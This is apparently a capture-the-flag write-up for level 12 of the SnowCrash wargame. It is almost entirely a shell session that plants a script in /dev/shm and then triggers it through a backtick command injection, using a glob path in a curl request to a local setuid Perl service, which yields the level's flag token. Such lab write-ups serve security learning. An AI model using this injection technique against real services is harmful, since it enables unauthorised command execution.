# Level 12

## Vulnerability

## Context
```
level12@SnowCrash:~$ ls -l
total 4
-rwsr-sr-x+ 1 flag12 level12 464 Mar  5  2016 level12.pl
```
## Solution




```
level12@SnowCrash:~$ echo "getflag > /dev/shm/flag12" > /dev/shm/EXPLOIT
level12@SnowCrash:~$ cat /dev/shm/EXPLOIT
getflag > /dev/shm/flag12

level12@SnowCrash:~$ cd /dev/shm

level12@SnowCrash:/dev/shm$ `EXPLOIT`
EXPLOIT: command not found

level12@SnowCrash:/dev/shm$ `/dev/shm/EXPLOIT`
bash: /dev/shm/EXPLOIT: Permission denied

level12@SnowCrash:/dev/shm$ chmod 755 EXPLOIT
level12@SnowCrash:/dev/shm$ `/dev/shm/EXPLOIT`
level12@SnowCrash:/dev/shm$ ls
EXPLOIT  flag12
level12@SnowCrash:/dev/shm$ cat flag12
Check flag.Here is your token :
Nope there is no token here for you sorry. Try again :)

level12@SnowCrash:/dev/shm$ curl '127.0.0.1:4646?x="`/*/*/EXPLOIT`"'
..level12@SnowCrash:/dev/shm$ cat flag12
Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
level12@SnowCrash:/dev/shm$


```
